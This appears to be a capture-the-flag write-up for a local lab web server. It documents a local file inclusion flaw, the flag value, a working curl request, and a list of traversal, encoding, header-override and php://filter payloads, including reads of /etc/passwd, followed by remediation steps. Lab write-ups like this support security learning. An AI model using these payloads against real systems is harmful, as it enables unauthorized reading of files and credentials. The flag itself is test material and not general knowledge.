# Web Server Fingerprinting Breach

## Vulnerability Type
Web Server Fingerprinting & Local File Inclusion (LFI)

## OWASP Reference
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server

## Discovery Method
1. The html itself already provided the flag under copyright class.

## Flag Location
- Request: `/index.php?page=../flag`
- Flag: `b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

## Shell Commands to Find Flag

### Working Command
```bash
curl -s 'http://localhost:8080/index.php?page=../flag'
```

### Other Test Commands
```bash
# Basic LFI attempts
curl -s 'http://localhost:8080/index.php?page=../../flag'
curl -s 'http://localhost:8080/index.php?page=..%2Fflag'
curl -s 'http://localhost:8080/index.php?page=..%252Fflag'

# Check server headers
curl -I http://localhost:8080 | grep -E 'Server|X-Powered-By'

# Alternative tools
wget -qO- 'http://localhost:8080/index.php?page=../flag'
echo -e 'GET /index.php?page=../flag HTTP/1.0\r\n\r\n' | nc localhost 8080

# Different parameters
curl -s 'http://localhost:8080/index.php?file=../flag'
curl -s 'http://localhost:8080/index.php?include=../flag'
curl -s 'http://localhost:8080/index.php?path=../flag'

# URL encoding
curl -s 'http://localhost:8080/index.php?page=%2E%2E%2Fflag'
curl -s 'http://localhost:8080/index.php?page=%252E%252E%252Fflag'

# Custom headers
curl -s -H 'X-Original-URL: /index.php?page=../flag' http://localhost:8080/
curl -s -H 'X-Rewrite-URL: /index.php?page=../flag' http://localhost:8080/

# PHP wrappers
curl -s 'http://localhost:8080/index.php?page=php://filter/convert.base64-encode/resource=../flag'
curl -s 'http://localhost:8080/index.php?page=file:///../flag'

# Common LFI targets
curl -s 'http://localhost:8080/index.php?page=/etc/passwd'
curl -s 'http://localhost:8080/index.php?page=../../../../../etc/passwd'

# Direct access
curl -s 'http://localhost:8080/flag'
```

## Security Impact
1. **Information Disclosure**: Server version exposed for targeted attacks
2. **File Read Access**: Arbitrary file reading capability
3. **Further Exploitation**: Version info enables CVE targeting

## Remediation
1. Hide server headers in nginx/PHP configuration
2. Validate and sanitize the `page` parameter
3. Use whitelisting for allowed page values
4. Implement WAF rules
5. Apply principle of least privilege

## Testing Script
```bash
python3 web_server_fingerprint_exploit.py
```